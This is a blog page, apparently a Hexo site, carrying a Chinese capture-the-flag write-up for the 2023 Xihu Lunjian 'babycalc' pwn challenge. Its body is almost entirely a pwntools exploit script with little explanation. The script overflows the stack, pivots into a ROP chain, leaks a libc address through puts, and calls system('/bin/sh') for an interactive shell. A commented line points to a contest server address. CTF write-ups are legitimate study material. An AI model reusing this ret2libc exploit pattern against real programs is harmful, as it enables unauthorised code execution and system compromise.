@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="本次wp首次尝试使用视频方式表示 视频地址：2022西湖论剑 babycalc复现_哔哩哔哩_bilibili exp: from pwn import*io &#x3D; process(&quot;.&#x2F;pwn&quot;)#io &#x3D; remote(&quot;1.14.71.254&quot;,28066)context.log_level &#x3D; &quot;debug&quot;context.arch">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023西湖论剑calc">
+<meta property="og:url" content="http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/index.html">
+<meta property="og:site_name" content="C12en">
+<meta property="og:description" content="本次wp首次尝试使用视频方式表示 视频地址：2022西湖论剑 babycalc复现_哔哩哔哩_bilibili exp: from pwn import*io &#x3D; process(&quot;.&#x2F;pwn&quot;)#io &#x3D; remote(&quot;1.14.71.254&quot;,28066)context.log_level &#x3D; &quot;debug&quot;context.arch">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-02-05T10:08:55.000Z">
+<meta property="article:modified_time" content="2023-09-14T17:17:27.148Z">
+<meta property="article:author" content="C12en">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+    
+    <!-- title -->
+    <title>2023西湖论剑calc</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="C12en" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/02/11/%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/02/04/mprotect%E4%BF%AE%E6%94%B9bss%E6%AE%B5%E6%9D%83%E9%99%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&text=2023西湖论剑calc"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&title=2023西湖论剑calc"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&is_video=false&description=2023西湖论剑calc"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023西湖论剑calc&body=Check out this article: http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&title=2023西湖论剑calc"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&title=2023西湖论剑calc"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&title=2023西湖论剑calc"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&title=2023西湖论剑calc"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&name=2023西湖论剑calc&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&t=2023西湖论剑calc"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        2023西湖论剑calc
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">C12en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-02-05T10:08:55.000Z" class="dt-published" itemprop="datePublished">2023-02-05</time>
+        
+        (Updated: <time datetime="2023-09-14T17:17:27.148Z" class="dt-updated" itemprop="dateModified">2023-09-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/wp/">wp</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>本次wp首次尝试使用视频方式表示</p>
+<p>视频地址：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1R8411M7hF/?spm_id_from=333.999.0.0&vd_source=8543a418a87bc93ee104e52809d057c2">2022西湖论剑 babycalc复现_哔哩哔哩_bilibili</a></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;1.14.71.254&quot;,28066)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;buu_libc_ubuntu16_64&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./locate_libc2.23&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">ret_addr = <span class="number">0x4005b9</span></span><br><span class="line">rdi_addr = <span class="number">0x400ca3</span></span><br><span class="line">rsi_r15_addr = <span class="number">0x400ca1</span></span><br><span class="line">bss_addr = <span class="number">0x602510</span></span><br><span class="line">rsp_r13_r14_r15_addr = <span class="number">0x400c9d</span></span><br><span class="line">read_plt = <span class="number">0x4005f0</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_plt = <span class="number">0x4005d0</span></span><br><span class="line"><span class="comment">#key = p64(0xa111423746352413)+p64(0x318c77665d48332)</span></span><br><span class="line">payload = <span class="string">b&#x27;24&#x27;</span>+cyclic(<span class="number">0x6</span>)+p64(ret_addr)*<span class="number">17</span></span><br><span class="line">payload += p64(rdi_addr)+p64(<span class="number">0</span>)+p64(rsi_r15_addr)+p64(bss_addr)+p64(<span class="number">0</span>)+p64(read_plt)+p64(rsp_r13_r14_r15_addr)+p64(bss_addr-<span class="number">0x18</span>)</span><br><span class="line">payload += p8(<span class="number">19</span>)+p8(<span class="number">36</span>)+p8(<span class="number">53</span>)+p8(<span class="number">70</span>)+p8(<span class="number">55</span>)+p8(<span class="number">66</span>)+p8(<span class="number">17</span>)+p8(<span class="number">161</span>)+p8(<span class="number">50</span>)+p8(<span class="number">131</span>)+p8(<span class="number">212</span>)+p8(<span class="number">101</span>)+p8(<span class="number">118</span>)+p8(<span class="number">199</span>)+p8(<span class="number">24</span>)+p8(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#payload += key</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>-<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0x38</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x400BB8&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">payload = p64(rdi_addr)+p64(read_got)+p64(puts_plt)+p64(rdi_addr)+p64(<span class="number">0</span>)+p64(rsi_r15_addr)+p64(bss_addr+<span class="number">0x48</span>)+p64(<span class="number">0</span>)+p64(read_plt)</span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x400c9d&#x27;)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">read_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc_addr = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">payload = p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&text=2023西湖论剑calc"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&title=2023西湖论剑calc"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&is_video=false&description=2023西湖论剑calc"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023西湖论剑calc&body=Check out this article: http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&title=2023西湖论剑calc"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&title=2023西湖论剑calc"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&title=2023西湖论剑calc"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&title=2023西湖论剑calc"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&name=2023西湖论剑calc&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/02/05/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91calc/&t=2023西湖论剑calc"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    C12en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'c12en';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
